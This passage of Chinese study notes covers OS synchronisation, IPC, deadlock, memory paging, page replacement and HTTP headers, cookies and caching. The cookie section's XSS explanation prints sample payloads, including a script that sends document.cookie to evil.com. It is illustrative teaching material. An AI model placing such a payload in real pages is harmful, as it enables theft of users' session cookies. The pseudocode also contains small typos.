        do_write()
        up(data_mutex)
}
```

但是上述的代码是经典的读者优先，一旦有源源不断的读者到来，那么写者就会一直阻塞，导致饿死的状态，下面的是改进版本

```python
read_count = 0 	#  计算读者的数量
write_count = 0	#  计算写者的数量
data_mutex = 1 	#  资源锁
read_mutex = 1 	#  读者锁，对于读者count的修改
write_mutex = 1	#  写者锁，对于写者count的修改
read_lock = 1   #  读者锁，防止写者饿死

def read(){
    while True:
        down(read_lock)
        down(read_mutex)
        read_count += 1
        if (read_count) == 1:
            down(data_mutex)
        up(read_mutex)
        up(read_lock)   # 没有释放的话，其他读者不能进入，就变成串行了

        do_read()

        down(read_mutex)
        read_count -= 1
        if read_count == 0:
    		up(data_mutex)
    	up(read_mutex)
}

def write(){
    while True:
    	down(write_mutex)
    	write_count += 1
    	if write_count == 1:
    		down(read_lock)
    	up(write_mutex)
    	
    	donw(data_mutex)
    	do_write()
    	up(data_mutex)
    	
    	down(write_nutex)
    	write_count -= 1
    	if write_count == 0:
    		up(read_lock)
    	up(write_mutex)
}
```

### 进程通信

进程同步和进程通信不一样

- 进程同步：控制多个进程按一定顺序执行；
- 进程通信：进程间传输信息。

==进程之间通信可以传递进程同步所需要的信息==

**管道**

管道只能用于父子进程的通信

```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>

#define STRING "hello world!"

int main()
{
	int pipefd[2];
	pid_t pid;
	char buf[BUFSIZ];

	if (pipe(pipefd) == -1) {
		perror("pipe()");
		exit(1);
	}

	pid = fork();
	if (pid == -1) {
		perror("fork()");
		exit(1);
	}

    // pid=0是子进程，父进程有自己的pid
	if (pid == 0) {
		/* this is child. */
		printf("Child pid is: %d\n", getpid());
        // read(pipefd[0], buf, BUFSIZ的结果会返回实际读取的字节数
		if (read(pipefd[0], buf, BUFSIZ) < 0) {
			perror("write()");
			exit(1);
		}

		printf("%s\n", buf);

		bzero(buf, BUFSIZ);
		snprintf(buf, BUFSIZ, "Message from child: My pid is: %d", getpid());
        // snprintf后面的参数意思是：buf表示的是要写到哪里去，BUFSIZ表示的是buf缓冲区最大为多少，后面就是要写入到缓冲区的数据
		if (write(pipefd[1], buf, strlen(buf)) < 0) {
			perror("write()");
			exit(1);
		}

	} else {
		/* this is parent */
		printf("Parent pid is: %d\n", getpid());

		snprintf(buf, BUFSIZ, "Message from parent: My pid is: %d", getpid());
		if (write(pipefd[1], buf, strlen(buf)) < 0) {
			perror("write()");
			exit(1);
		}

		sleep(1);
	
		bzero(buf, BUFSIZ);
		if (read(pipefd[0], buf, BUFSIZ) < 0) {
			perror("write()");
			exit(1);
		}

		printf("%s\n", buf);

		wait(NULL);
	}


	exit(0);
}
```

**FIFO**

FIFO又叫做命名管道，去掉了管道只能在父子进程间使用的限制，FIFO可以在兄弟进程之间通信，相当于是共享一个文件，两个进程可以写以及读该文件

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <sys/wait.h>

#define FIFO_PATH "/tmp/myfifo"   // FIFO 的文件路径
#define BUF_SIZE 128              // 缓冲区大小

int main(void) {
    // 创建命名管道（FIFO）
    if (mkfifo(FIFO_PATH, 0666) == -1) {
        perror("mkfifo");
        // 如果 FIFO 已经存在，可以继续运行
    }
    
    pid_t writer_pid, reader_pid;
    
    // 创建第一个子进程 —— 写者
    writer_pid = fork();
    if (writer_pid < 0) {
        perror("fork");
        exit(EXIT_FAILURE);
    }
    if (writer_pid == 0) {
        // 子进程：写者
        int fd = open(FIFO_PATH, O_WRONLY);
        if (fd < 0) {
            perror("open writer");
            exit(EXIT_FAILURE);
        }
        char message[BUF_SIZE];
        // 构造消息，包含写者的 pid
        snprintf(message, BUF_SIZE, "Hello from writer sibling, pid: %d", getpid());
        if (write(fd, message, strlen(message)) < 0) {
            perror("write");
            close(fd);
            exit(EXIT_FAILURE);
        }
        close(fd);
        exit(EXIT_SUCCESS);
    }

    // 创建第二个子进程 —— 读者
    reader_pid = fork();
    if (reader_pid < 0) {
        perror("fork");
        exit(EXIT_FAILURE);
    }
    if (reader_pid == 0) {
        // 子进程：读者
        int fd = open(FIFO_PATH, O_RDONLY);
        if (fd < 0) {
            perror("open reader");
            exit(EXIT_FAILURE);
        }
        char buf[BUF_SIZE];
        int num = read(fd, buf, BUF_SIZE - 1);
        if (num < 0) {
            perror("read");
            close(fd);
            exit(EXIT_FAILURE);
        }
        buf[num] = '\0'; // 添加字符串结束符
        printf("Reader sibling received: %s\n", buf);
        close(fd);
        exit(EXIT_SUCCESS);
    }

    // 父进程：等待子进程结束
    wait(NULL);
    wait(NULL);
    
    // 删除 FIFO 文件
    if (unlink(FIFO_PATH) == -1) {
        perror("unlink");
        exit(EXIT_FAILURE);
    }
    
    return 0;
}
```

**消息队列**

- 消息队列是在内核中作为一种系统资源创建的，并不依赖于某个具体的进程保持活动状态，也就是说即使所有使用该消息队列的读进程和写进程都退出或终止，消息队列本身仍然存在，直到有进程或系统调用显式地将其删除。

- 不需要进程自己提供同步方法

- 读进程可以根据==消息类型==自己选择接收消息，而不是默认接收消息

```python
from multiprocessing import Process, Queue
import time

def producer(queue):
    """生产者：不断产生消息放入队列"""
    for i in range(5):
        item = f"Message {i}"
        print(f"Producer: producing {item}", flush=True)
        queue.put(item)
        time.sleep(1)  # 模拟产生数据的延时
    # 生产完毕后，发送结束标志以通知消费者退出
    queue.put("DONE")

def consumer(queue):
    """消费者：不断从队列中取出消息进行处理"""
    while True:
        item = queue.get()  # 阻塞式地等待队列中有新的消息
        if item == "DONE":
            # 收到结束标志后退出循环
            break
        print(f"Consumer: got {item}", flush=True)

if __name__ == "__main__":
    # 创建一个消息队列，用于进程间传递数据
    msg_queue = Queue()
    
    # 创建生产者和消费者进程
    p = Process(target=producer, args=(msg_queue,))
    c = Process(target=consumer, args=(msg_queue,))

    p.start()
    c.start()

    p.join()  # 等待生产者结束
    c.join()  # 等待消费者结束

```

**信号量**

它是一个计数器，用于为多个进程提供对共享数据对象的访问

**共享内存**

允许多个进程共享一个给定的存储区。需要用信号量对存储区进行管理。多个进程可以将同一个文件映射到他们的地址块从而实现共享内存

**套接字**

它可用于不同机器间的进程通信

## 死锁

### 必要条件

> 互斥：一个资源分配给一个进程了，其他进程就得等待
> 请求和保持：一个进程已经得到了某些资源还要请求其他的资源
>
> 不可剥夺：一个进程已经占有的资源其他进程不能抢占，只能等持有资源的进程主动释放资源
>
> 环路等待：有两个或两个以上的进程组成一条环路，环路中的每个进程都在等待下个进程所占有的资源

### 处理死锁的方法

**鸵鸟策略**

> 鸵鸟策略是忽略死锁，当发生死锁不会对用户造成多大的影响或者发生死锁的概率很低，可以采取鸵鸟策略。当前大多数操作系统处理死锁的办法就是忽略死锁。

**死锁检测和死锁恢复**

死锁检测：

1. 每种类型一个资源的死锁检测（系统中每种资源只有一个可用）

每个进程需要一个资源，画图，如果有环的话则代表会发生死锁，例如下图圆圈表示进程，方框表示资源。（图（a）可以抽取出图（b））

![image-20250409204057838](D:\typora图片\image-20250409204057838.png)

2. 每种类型多个资源的死锁检测（系统中每种资源有多个可用）

![img](D:\typora图片\e1eda3d5-5ec8-4708-8e25-1a04c5e11f48.png)

> 算法流程：
>
> 1. 寻找一个没有标记的进程 Pi，它所请求的资源小于等于 A。
> 2. 如果找到了这样一个进程，那么将 C 矩阵的第 i 行向量加到 A 中，标记该进程，并转回 1。
> 3. 如果没有这样一个进程，算法终止。

上图中，有三个进程四个资源，每个数据代表的含义如下：

- E 向量：资源总量
- A 向量：资源剩余量
- C 矩阵：每个进程所拥有的资源数量，每一行都代表一个进程拥有资源的数量
- R 矩阵：每个进程请求的资源数量

进程 P1 和 P2 所请求的资源都得不到满足，只有进程 P3 可以，让 P3 执行，之后释放 P3 拥有的资源，此时 A = (2 2 2 0)。P2 可以执行，执行后释放 P2 拥有的资源，A = (4 2 2 1) 。P1 也可以执行。所有进程都可以顺利执行，没有死锁。

死锁恢复：

- 利用抢占恢复
- 利用回滚恢复
- 通过杀死进程恢复

**死锁预防**

在程序运行前进行检测，死锁预防就是破坏死锁的四个必要条件中的一个，属于进程同步的范畴

1. 破坏互斥条件

（1） 将原本独占的资源变成共享资源

（2） 采用无锁算法（Lock-free algorithms）或乐观并发控制（Optimistic Concurrency Control），让多个进程或线程可以并发地对共享数据进行操作，而不必依赖传统的互斥锁

2. 破坏请求和保持

所有进程在开始的时候请求所有需要的资源，要么全部都给，要么全部都不给

3. 破坏不可剥夺

（1） 如果一个进程占有资源并且请求其他资源时发现资源不足，可以将它已持有的某些资源强制收回（即预占），然后将这些资源分配给其他等待的进程。

（2） 当进程请求资源导致潜在死锁时，系统可以选择中断该进程，将其回滚到某个之前的安全状态，然后回收其已分配的资源，重新调度执行。

4. 破坏环路等待

给资源统一编号，进程只能按照编号顺序来请求资源

**死锁避免**

在程序运行的时候避免死锁，银行家算法

![img](D:\typora图片\62e0dd4f-44c3-43ee-bb6e-fedb9e068519.png)

> 上图中有五个进程，四个资源。左边的图表示已经分配的资源，右边的图表示还需要分配的资源。最右边的 E、P 以及 A 分别表示：总资源、已分配资源以及可用资源，注意这三个为向量，而不是具体数值，例如 A=(1020)，表示 4 个资源分别还剩下 1/0/2/0。
>
> 检查一个状态是否安全的算法如下：
>
> - 查找右边的矩阵是否存在一行小于等于向量 A。如果不存在这样的行，那么系统将会发生死锁，状态是不安全的。
> - 假若找到这样一行，将该进程标记为终止，并将其已分配资源加到 A 中。
> - 重复以上两步，直到所有进程都标记为终止，则状态时安全的。
>
> 如果一个状态不是安全的，需要拒绝进入这个状态。

## 内存管理

虚拟内存的目的是为了将物理内存扩充为更大的逻辑内存，从而让程序有更多的可用内存。

虚拟内存允许程序不用将其地址空间的每一页放入到内存中，在有需要的时候再将其调入内存中。

### 分页系统地址映射

内存管理单元（MMU）管理着地址空间和物理内存的转换，其中的页表（Page table）存储着页（就是虚拟地址空间也叫程序地址空间）和页框（物理内存空间）的映射表。

一个虚拟地址分为两个部分，一个是页面号，一个是是存储偏移量

下图中页表中存放着16页，所以需要4位来标识哪一页，所以虚拟地址的前4位（0010）表示的就是第2页

去页表中找第2页的物理地址，找到的是（110），将第二页的物理地址和偏移地址结合起来就得到物理地址。（其中页表中的最后一位表示的是该页面是否在内存中 0/1）

![img](D:\typora图片\cf4386a1-58c9-4eca-a17f-e12b1e9770eb.png)

### 页面置换算法

在程序运行的过程中如果要访问的页面不在内存中就会发生缺页中断，将缺的页调入到内存中。如果此时内存中没有空闲页的话就会选择一个页面换出然后换入新的页面

页面置换算法的目的是使页面置换的频率最低

**最佳置换(OPT)**

所选择换出的页面是未来最长时间内不会被访问的

这种一种理想的算法，因为你不知道被换出的页面会多长时间不再被访问

**最近最久未使用(LRU)**

根据过去使用的情况，将过去最久没有用到的页面进行置换

可以用python字典的形式来实现LRU算法

> 基本思路如下：
>
> 1. 字典存储页面信息
>     用字典存储页面，键（key）为页面标识，值（value）可以表示该页面最后一次被访问的时间戳或计数器。
> 2. 容量限制
>     设定字典的容量为 3，当字典中页面数超过 3 时，需要进行置换（移除最久未使用的页面）。
> 3. 访问页面时的处理
>    - 如果请求的页面在字典中，则更新该页面对应的值（例如更新为当前时间戳），表示该页面刚刚被访问过。
>    - 如果请求的页面不在字典中，则：
>      - 找出字典中值最小（即最久未被访问）的页面，
>      - 将其删除，
>      - 然后将新页面插入到字典中，并记录访问时间。

在复杂的场景下可以用双向链表加哈希的方式来实现LRU

```python
class Node:
    def __init__(self, key, value):
        self.key = key      # 页面（或缓存项）的标识
        self.value = value  # 页面（或缓存项）的内容
        self.prev = None    # 指向前一个节点
        self.next = None    # 指向后一个节点

class LRUCache:
    def __init__(self, capacity):
        self.capacity = capacity         # 缓存的容量
        self.cache = {}                  # 字典：键 -> 节点，用于 O(1) 查找
        # 初始化双向链表：使用伪头部和伪尾部节点简化边界操作
        self.head = Node(0, 0)           # 伪头节点
        self.tail = Node(0, 0)           # 伪尾节点
        self.head.next = self.tail
        self.tail.prev = self.head

    def _remove(self, node):
        """将节点从双向链表中移除。"""
        prev_node = node.prev
        next_node = node.next
        prev_node.next = next_node
        next_node.prev = prev_node

    def _add(self, node):
        """将节点添加到链表头部（紧接伪头节点之后），表示最近访问过。"""
        node.prev = self.head
        node.next = self.head.next
        self.head.next.prev = node
        self.head.next = node

    def get(self, key):
        """获取 key 对应的值。如果存在，将节点移动到链表头部；否则返回 -1。"""
        if key in self.cache:
            node = self.cache[key]
            self._remove(node)    # 移除节点原来的位置
            self._add(node)       # 添加到头部，表示最近使用
            return node.value
        else:
            return -1

    def put(self, key, value):
        """设置 key 对应的值。如果 key 已存在，则更新值并移到头部；否则插入新节点，
           如果缓存容量达到上限，则淘汰最久未使用的节点。"""
        if key in self.cache:
            node = self.cache[key]
            node.value = value
            self._remove(node)
            self._add(node)
        else:
            if len(self.cache) >= self.capacity:
                # 淘汰最久未使用的节点，即伪尾节点前面的节点
                lru = self.tail.prev
                self._remove(lru)
                del self.cache[lru.key]
            new_node = Node(key, value)
            self._add(new_node)
            self.cache[key] = new_node

# 测试代码
if __name__ == "__main__":
    lru = LRUCache(capacity=3)
    
    # 插入三个缓存项
    lru.put('A', "Data for A")
    lru.put('B', "Data for B")
    lru.put('C', "Data for C")
    
    print("Initial cache:")
    for key, node in lru.cache.items():
        print(key, "->", node.value)
    
    # 访问 B，使其成为最近使用的缓存项
    print("\nAccess B:", lru.get('B'))
    
    # 插入新页面 D，缓存容量为 3，因此最久未使用的（未被访问的）会被淘汰
    lru.put('D', "Data for D")
    
    print("\nCache after adding D:")
    for key, node in lru.cache.items():
        print(key, "->", node.value)
    
    # 试图访问被淘汰的页面 A 应该返回 -1
    print("\nAccess A:", lru.get('A'))

```

**最近未使用（NRU）**

使用两个状态位R和M来标记页面

NRU（Not Recently Used）算法将页面根据“引用位 (R)”和“修改位 (M)”分为四个类别，优先替换最低类别的页面（将页面从内存掉出到磁盘里面）。具体分类和替换优先级如下：

- **类别 0 (R=0, M=0)**：既没有被引用，也没有被修改。
   这是最佳候选，因为页面既不活跃，也没有脏数据需要保存。
- **类别 1 (R=0, M=1)**：未被引用，但被修改了。
   这类页面虽然不活跃，但因为有修改（脏页），在替换前需要写回磁盘。（所以要将其调出写入磁盘）
- **类别 2 (R=1, M=0)**：被引用但未被修改。
   说明近期被使用过，不宜替换。
- **类别 3 (R=1, M=1)**：被引用且被修改。
   这类页面使用活跃，替换优先级最低。

因此，在这四种情况下，**NRU算法会优先置换 R=0, M=0 的页面**。如果没有类别 0 的页面，则会选择类别 1，依次类推。

**先进先出**

选择换出的页面是最先进入的页面，该算法会将那些经常被访问的页面换出导致缺页率高

**第二次机会算法**

可以看https://blog.csdn.net/wangnanwlw/article/details/141750255

==第二次机会算法是改进版的FIFO==

当页面被访问（读/写）时将该页面的R置为1，需要替换的时候检查当前页面的R是否是1，是1的话就将其置换为0，并继续检查下一个位置的页面

**时钟**

第二次机会算法需要在链表中移动页面，降低了效率。时钟算法采用的是环形链表将页面连接起来，再用指针指向最老的页面

### 分段

分段是将内存分为一个一个的段，每个段的大小可以是不一样的，但是分页的话，页的大小必须一样



==分页和分段的对比：==

> - 对程序员的透明性：分页透明，但是分段需要程序员显式划分每个段。
> - 地址空间的维度：分页是一维地址空间，分段是二维的。
> - 大小是否可以改变：页的大小不可变，段的大小可以动态改变。
> - 出现的原因：分页主要用于实现虚拟内存，从而获得更大的地址空间；分段主要是为了使程序和数据可以被划分为逻辑上独立的地址空间并且有助于共享和保护。

### 段页式

程序的地址空间被划分多为多个段，每个段被划分成为大小相同的页，这样既有分段系统的共享和保护又有分页系统的虚拟内存空间

==段页式存储计算分为三部分，一部分是段号一个是段内页号，一部分是页内地址==

> 假设系统有如下段表信息：
>
> - 段 2 的基地址（起始物理地址）为 0x10000
> - 每个段内划分为若干页，每页大小为 256 字节
>
> 在段 2 内，要访问第 3 页（段内页号 3）的内容。
>
> - 由于页大小为 256 字节，第 3 页在物理地址上相对于段起始位置的偏移为
>    3 × 256 = 768（十进制），即 0x300（十六进制）。
> - 然后，加上页内偏移 0xAF。
>
> 因此，该逻辑地址对应的物理地址计算为：
>
> ```markdown
> 复制物理地址 = 段 2 的基地址 + （段内页号 3 × 页大小） + 页内偏移
>          = 0x10000 + 0x300 + 0xAF
>          = 0x10000 + 0x3AF
>          = 0x103AF
> ```

### 磁盘调度

设备管理就是磁盘调度，磁盘调度就是将数据从硬盘转移到内存中或者是从内存中转移到硬盘。==磁盘调度决定的是调度的顺序==

**磁盘结构**

- 盘面（Platter）：一个磁盘有多个盘面；
- 磁道（Track）：盘面上的圆形带状区域，一个盘面可以有多个磁道；
- 扇区（Track Sector）：磁道上的一个弧段，一个磁道可以有多个扇区，它是最小的物理储存单位，目前主要有 512 bytes 与 4 K 两种大小；
- 磁头（Head）：与盘面非常接近，能够将盘面上的磁场转换为电信号（读），或者将电信号转换为盘面的磁场（写）；
- 制动手臂（Actuator arm）：用于在磁道之间移动磁头；
- 主轴（Spindle）：使整个盘面转动。

![img](D:\typora图片\014fbc4d-d873-4a12-b160-867ddaed9807.jpg)

**磁盘调度算法**

读写一个磁盘块的时间的影响因素有：

- 旋转时间（主轴转动盘面，使得磁头移动到适当的扇区上）
- 寻道时间（制动手臂移动，使得磁头移动到适当的磁道上）
- 实际的数据传输时间

其中，寻道时间最长，因此磁盘调度的主要目标是使磁盘的平均寻道时间最短。

1. 先来先服务

按照磁盘请求的顺序进行调度。

优点是公平和简单。缺点也很明显，因为未对寻道做任何优化，使平均寻道时间可能较长。

2. 最短寻道时间优先（SSTF, Shortest Seek Time First）

优先调度与当前磁头所在磁道距离最近的磁道。

虽然平均寻道时间比较低，但是不够公平。如果新到达的磁道请求总是比一个在等待的磁道请求近，那么在等待的磁道请求会一直等待下去，也就是出现饥饿现象。具体来说，两端的磁道请求更容易出现饥饿现象。

3. 电梯算法（SCAN）

总是按照一个方向来进行磁盘调度，直到这个方向上没有未完成的磁盘请求，然后改变方向























# HTTP

## 基础概念

```http
GET http://www.example.com/ HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cache-Control: max-age=0
Host: www.example.com
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947+gzip"
Proxy-Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 xxx

param1=1&param2=2
```

> Accept											告诉服务器我能接受哪些类型的资源
> Accept-Encoding							支持的数据压缩格式（gzip等）
> Accept-Language							浏览器偏好的语言
> Cache-Control								控制是否使用本地缓存
> Host												请求的是哪个主机
> If-Modified-Since							本地缓存资源在服务器修改时间（判断上一次连接之后服务器有没有修改过该资源）
> If-None-Match								本地资源的 ETag，用于条件请求
>
> （修改时间可能是s为单位的，不能及时更新，但是搭配ETag就可以很好的进行资源更新判断，只要资源修改过一次那么就会更新ETag）
> Proxy-Connection							给代理用的长连接设置（非标准）
> Upgrade-Insecure-Requests			表示愿意升级为 HTTPS
> User-Agent										浏览器和系统的信息

```http
HTTP/1.1 200 OK
Age: 529651
Cache-Control: max-age=604800
Connection: keep-alive
Content-Encoding: gzip
Content-Length: 648
Content-Type: text/html; charset=UTF-8
Date: Mon, 02 Nov 2020 17:53:39 GMT
Etag: "3147526947+ident+gzip"
Expires: Mon, 09 Nov 2020 17:53:39 GMT
Keep-Alive: timeout=4
Last-Modified: Thu, 17 Oct 2019 07:18:26 GMT
Proxy-Connection: keep-alive
Server: ECS (sjc/16DF)
Vary: Accept-Encoding
X-Cache: HIT

<!doctype html>
<html>
<head>
    <title>Example Domain</title>
	// 省略... 
</body>
</html>
```

> HTTP/1.1 200 OK													状态码，表示请求成功，服务器返回了网页内容
> Age: 529651															当前资源在缓存中存在的时间（秒），如 CDN 缓存了 6 天
> Cache-Control: max-age=604800							告诉浏览器或代理服务器：这个资源最多缓存 604800 秒（7天）
> Connection: keep-alive											告诉浏览器保持 TCP 连接，不用每次都重新连接
> Content-Encoding: gzip											响应内容使用了 gzip 压缩，节省带宽，加快加载速度
> Content-Length: 648												响应内容的大小（单位：字节，注意是压缩后的长度）
> Content-Type: text/html; charset=UTF-8				内容类型为 HTML 页面，字符编码为 UTF-8（支持多语言）
> Date: Mon, 02 Nov 2020 17:53:39 GMT				响应生成时间，服务器返回这份内容的时间戳
> Etag: "3147526947+ident+gzip"							当前资源的唯一标识符，用于条件缓存，浏览器下次请求可用 If-None-Match 比对是否更新
> Expires: Mon, 09 Nov 2020 17:53:39 GMT			HTTP/1.0 缓存策略，资源到这个时间前可以使用缓存（与 Cache-Control 搭配使用）
> Keep-Alive: timeout=4											表示当前连接会保持 4 秒后关闭（适用于 Keep-Alive）
> Last-Modified: Thu, 17 Oct 2019 07:18:26 GMT	资源最后修改时间，用于 If-Modified-Since 条件缓存判断
> Proxy-Connection: keep-alive								给代理服务器用的连接保持设置（非标准字段）
> Server: ECS (sjc/16DF)										服务器使用的软件信息（此处为边缘缓存服务器 ECS，可能是 CDN 节点）
> Vary: Accept-Encoding										代理服务器/缓存系统应该根据 Accept-Encoding（如 gzip、br）分别缓存不同压缩版本
> X-Cache: HIT														本次请求命中了缓存（如来自 CDN 或代理缓存），不是从源站重新拉取的

## HTTP方法

> GET						获取资源（最常见，用于浏览网页、获取数据）
> POST					 提交数据（如表单提交、创建资源）
> PUT						更新资源（整体替换）
> PATCH					局部更新资源
> DELETE				 删除资源
> HEAD					 获取资源的“头部信息”，不返回具体内容
> OPTIONS				查询服务器支持哪些请求方法
> TRACE					服务器会将和另一个主机通信的路径返回客户端（不常用）
> CONNECT				用于建立隧道连接（如 HTTPS 代理）

**GET和POST区别**

幂等的意思是一个操作无论执行一次还是多次结果都是一样的

| 对比点   | `GET`                       | `POST`                   |
| -------- | --------------------------- | ------------------------ |
| 传参方式 | 参数放在 URL 中（如 ?q=xx） | 参数放在请求体中         |
| 安全性   | ❌ 容易暴露敏感信息          | ✅ 更安全                 |
| 请求体   | 无（或非常少）              | 有（结构复杂、内容丰富） |
| 语义     | 获取数据                    | 提交/处理数据            |
| 缓存     | 浏览器可能缓存              | 一般不会缓存             |
| 幂等性   | ✅ 幂等（多次无副作用）      | ❌ 不幂等（可能重复创建） |

## HTTP状态码

| 状态码 |               类别               |            含义            |
| :----: | :------------------------------: | :------------------------: |
|  1XX   |  Informational（信息性状态码）   |     接收的请求正在处理     |
|  2XX   |      Success（成功状态码）       |      请求正常处理完毕      |
|  3XX   |   Redirection（重定向状态码）    | 需要进行附加操作以完成请求 |
|  4XX   | Client Error（客户端错误状态码） |     服务器无法处理请求     |
|  5XX   | Server Error（服务器错误状态码） |     服务器处理请求出错     |

## 具体应用

![image-20250407102821481](D:\typora图片\image-20250407102821481.png)

短连接：每进行一次HTTP通信就得建一个TCP连接

长连接：建立一次TCP连接就可以进行多次HTTP通信

流水线：流水线是在同一条长连接上连续发出请求，而不用等待响应返回，这样可以减少延迟

## Cookie

用途

> - 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
> - 个性化设置（如用户自定义设置、主题等）
> - 浏览器行为跟踪（如跟踪分析用户行为等）

创建过程

> 1. 服务器发送的响应报文中会有 Set-Cookie字段，客户端会将Cookie内容字段保存到浏览器中
>
> 2. 客户端之后对同一个服务器发送请求时，会从浏览器中取出 Cookie 信息并通过 Cookie 请求首部字段发送给服务器

分类

> - 会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。==只在当前浏览器会话中有效==
> - 持久性 Cookie：有设置过期时间（Expires）或有效期（max-age）就称为持久性的Cookie。==即使浏览器关闭后仍然保留，直到过期==

作用域Domain 

> 规定了当前主机下面的哪些子域名可以接受当前的Cookie
>
>
> 例如：Set-Cookie: token=abc123; Domain=example.com; Path=/; HttpOnly;
> 那么当前主机下面的所有包含example.com的子域名都可以共享Cookie
>
> 会被 example.com、www.example.com、api.example.com 等所有子域共享

Javascript

> 客户端使用Javascript设置Cookie
>
> 用document.cookie来设置Cookie
> 
>
>
> 这样容易招到XSS(跨站脚本攻击)：
>
> 1. 反射型XSS：攻击代码嵌在 URL 里，服务器没做过滤，原样返回给用户 → 浏览器执行
>
> http://example.com/search?q=<script>alert('XSS')</script>
>
> 2. 存储型XSS：恶意脚本被保存到数据库或评论系统、论坛等地方，所有人都会执行这段
>
> <script>fetch('http://evil.com/steal?c=' + document.cookie)</script>
>
> 3. DOM型XSS：服务器并没有返回恶意脚本，浏览器自己进行拼接的
>
> http://example.com/#<script>alert('XSS')</script> 
>
> /# 后面的内容是不会被服务器看到的，后面的内容是哈希部分
>
> 前端插入到网页里没有进行任何的转义

HttpOnly

> 标记为 HttpOnly 的 Cookie 不能被 JavaScript 脚本调用

Session

Session和Cookie的区别如下

| 对比项             | Cookie                               | Session                                      |
| ------------------ | ------------------------------------ | -------------------------------------------- |
| 存储位置           | 🧠 客户端（浏览器）                   | 💾 服务器端（如内存、Redis、数据库）          |
| 保存形式           | 文本（键值对），由浏览器保存在本地   | 对应一个唯一 ID，值存储在服务器上            |
| 容量限制           | 每个 Cookie ~4KB，总量有限           | 较大，不受浏览器限制                         |
| 安全性             | ❌ 较低（可被用户查看/修改）          | ✅ 更安全（用户无法直接访问）                 |
| 是否可跨域访问     | ❌ 只能访问设置它的域名               | ❌ 也不能跨域，Session 绑定在当前网站         |
| 常见用途           | 保存用户偏好、登录 token、语言设置等 | 保存登录状态、购物车、权限等敏感信息         |
| 生命周期           | 可设置过期时间或关闭浏览器后销毁     | 通常由服务器控制（可设置 session 过期时间）  |
| 是否自动随请求发送 | ✅ 每次请求自动携带（`Cookie` 头）    | ❌ 需要先通过 Cookie 或 URL 携带 `Session ID` |

> Session和Cookie的配合使用
> 
>
> 1. 用户登录，服务器验证成功后创建 Session（如保存 `user_id`），服务器返回响应，**在 Cookie 中存一个 Session ID**：
>
> Set-Cookie: session_id=abc123; HttpOnly
>
> 2. 之后用户每次请求，浏览器自动带上这个 Cookie：
>
> Cookie: session_id=abc123
>
> 服务器根据这个 ID 找回 Session 内容，知道你是哪个用户。

## 缓存

- 让代理服务器进行缓存；
- 让客户端浏览器进行缓存

**Cache-Control**

==禁止缓存==

no-store 指令规定不能对请求或响应的任何一部分进行缓存。

```html
Cache-Control: no-store
```

==强制确认缓存==

no-cache 指令规定缓存服务器需要先向源服务器验证缓存资源的有效性，只有当缓存资源有效时才能使用该缓存对客户端的请求进行响应。

```html
Cache-Control: no-cache
```

==私有缓存和公共缓存==

private 指令规定了将资源作为私有缓存，只能被单独用户使用，一般存储在用户浏览器中。

```html
Cache-Control: private
```

public 指令规定了将资源作为公共缓存，可以被多个用户使用，一般存储在代理服务器中。

```html
Cache-Control: public
```

==缓存过期机制==

可以使用max-age字段以及Expires字段

```html
Cache-Control: max-age=31536000
Expires: Wed, 04 Jul 2012 08:26:05 GMT
```

==缓存验证==

==Etag==

URL不能唯一表示资源。这是因为同一个URL，如果用户的http请求头的内容不一样的话，那么就会返回不同的页面（就是不同的资源版本）

所以需要借助Etang来表示不同的资源，将缓存的Etag放入If-None-Match中，并由服务器进行检查最新的资源的Etag是否相同，相同的话则返回304，否则就返回新的资源

==Last-Modified==

Last-Modified是一种比较弱的验证，因为只能精确到秒级别的

```html
Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT  # 是服务器告诉浏览器的资源上次修改时间；
If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT # 是浏览器告诉服务器修改的时间
```

==Vary==

Vary是服务器告诉缓存系统返回的信息是依赖于哪些主机字段的

如果Vary: Accept-Language

那么就会按照Accept-Language对返回的资源进行分类，例如有的是中文和英文则返回不同的资源

==内容编码==

服务器则从中选择一种，使用该算法对响应的消息主体进行压缩，并且发送 Content-Encoding 首部来告知浏览器它选择了哪一种算法。

常用的内容编码有：gzip、compress、deflate、identity。浏览器发送 Accept-Encoding 首部，其中包含有它所支持的压缩算法，以及各自的优先级。

==范围请求==

如果网络出现中断，服务器只发送了一部分数据，范围请求可以使得客户端只请求服务器未发送的那部分数据，从而避免服务器重新发送所有数据。

1. **Range**

在请求报文中添加 Range 首部字段指定请求的范围。

```html
GET /z4d4kWk.jpg HTTP/1.1
Host: i.imgur.com
Range: bytes=0-1023
```

请求成功的话服务器返回的响应包含 206 Partial Content 状态码。

```html
HTTP/1.1 206 Partial Content
Content-Range: bytes 0-1023/146515
Content-Length: 1024
...
(binary content)
```

2. **Accept-Ranges**

响应首部字段 Accept-Ranges 用于告知客户端是否能处理范围请求，可以处理使用 ==bytes==，否则使用 ==none==。

```html
Accept-Ranges: bytes
```

3. **响应状态码**

- 在请求成功的情况下，服务器会返回 206 Partial Content 状态码。
- 在请求的范围越界的情况下，服务器会返回 416 Requested Range Not Satisfiable 状态码。
- 在不支持范围请求的情况下，服务器会返回 200 OK 状态码。

==分块传输编码==

Chunked Transfer Encoding，可以把数据分割成多块，让浏览器逐步显示页面。

==多部分对象集合==

一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。

> 例如 上传多个表单时可以使用如下方式：
>
> 移动端 / 前端上传多张图片，比如发朋友圈时选了三张图。
>
> 用 `POST` 请求 `multipart/form-data`，每张图都是一个 part。

==虚拟主机==

HTTP/1.1 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。

==通信数据转发==

**代理**

代理服务器接受客户端的请求，并且转发给其它服务器。

使用代理的主要目的是：

- 缓存
- 负载均衡
- 网络访问控制
- 访问日志记录

